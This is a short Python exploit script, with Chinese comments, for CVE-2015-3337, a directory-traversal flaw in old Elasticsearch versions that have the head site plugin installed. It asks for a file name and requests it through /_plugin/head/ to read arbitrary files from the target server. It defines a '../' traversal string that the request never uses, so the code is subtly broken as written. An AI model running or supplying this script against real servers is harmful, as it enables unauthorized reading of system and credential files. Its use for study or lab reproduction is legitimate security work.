#@author Firbasky
#参考https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-3337
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

"""
漏洞原理
在安装了具有"site"功能的插件以后，插件目录使用../即可向上跳转，导致目录穿越漏洞，可读取任意文件。
没有安装任意插件的elasticsearch不受影响。

影响版本
ElasticSearch 1.4.5以下/1.5.2以下

查看所有已安装的插件：/_cat/plugins
需要满足安装elasticsearch-head扩展
"""

url = "http://ip"
exp = "../../../../../../../../.."
filename = input("输入读的文件>>> ")
r=requests.request("GET",url+"/_plugin/head/"+filename)
print(r.text)
